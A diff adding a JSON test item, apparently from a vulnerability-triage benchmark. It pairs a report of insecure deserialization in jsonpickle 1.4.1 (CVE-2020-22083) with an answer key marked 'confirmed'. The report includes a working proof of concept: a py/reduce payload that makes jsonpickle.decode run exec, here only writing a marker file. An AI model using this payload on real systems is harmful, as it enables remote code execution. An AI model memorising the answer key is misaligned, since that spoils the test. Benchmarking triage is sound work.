@@ -1,0 +1,18 @@
+{
+  "report": {
+    "report_id": "jsonpickle-affected",
+    "package": "jsonpickle",
+    "affected_version": "1.4.1",
+    "title": "insecure deserialization in jsonpickle",
+    "body": "jsonpickle 1.4.1 is vulnerable to insecure deserialization (CVE-2020-22083). jsonpickle.decode on untrusted input executes attacker-controlled py/reduce payloads, leading to RCE.\n\nTracked as CVE-2020-22083.\n\nProof of concept:\n\n```python\nimport json, os, tempfile, jsonpickle\nm = os.path.join(tempfile.gettempdir(), \"slopgate_jsonpickle.marker\")\ntry: os.remove(m)\nexcept FileNotFoundError: pass\ncode = \"open(%r,'w').write('pwned')\" % m\npayload = json.dumps({\"py/reduce\": [{\"py/type\": \"builtins.exec\"},{\"py/tuple\": [code]}]})\ntry: jsonpickle.decode(payload)\nexcept Exception as e: print(\"raised:\", type(e).__name__)\nprint(\"SLOPGATE:REPRODUCED\" if os.path.exists(m) else \"SLOPGATE:NOT_REPRODUCED\")\n```\n",
+    "reporter": "researcher"
+  },
+  "ground_truth": {
+    "expected_verdict": "confirmed",
+    "package": "jsonpickle",
+    "fixed_version": null,
+    "cve": "CVE-2020-22083",
+    "source": "GHSA",
+    "note": "real deserialization CVE"
+  }
+}
